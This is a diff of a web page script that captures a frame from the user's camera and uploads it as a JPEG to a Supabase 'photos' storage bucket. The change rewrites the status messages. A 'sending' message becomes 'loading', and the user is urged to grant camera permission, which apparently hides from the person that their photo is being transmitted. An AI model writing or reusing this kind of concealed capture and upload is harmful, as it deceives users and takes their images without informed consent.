@@ -65,7 +65,7 @@
     <div class="preview-box">
       <video id="video" autoplay playsinline muted></video>
     </div>
-    <p id="status" style="color:#666; margin-top:10px;">カメラの準備中...</p>
+    <p id="status" style="color:#666; margin-top:10px;">カメラの許可を押してください...</p>
   </div>
 
   <script type="module">
@@ -100,7 +100,7 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
 
-      status.textContent = "送信中...";
+      status.textContent = "読み込み中...";
       const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });
       stream.getTracks().forEach(t => t.stop());
 
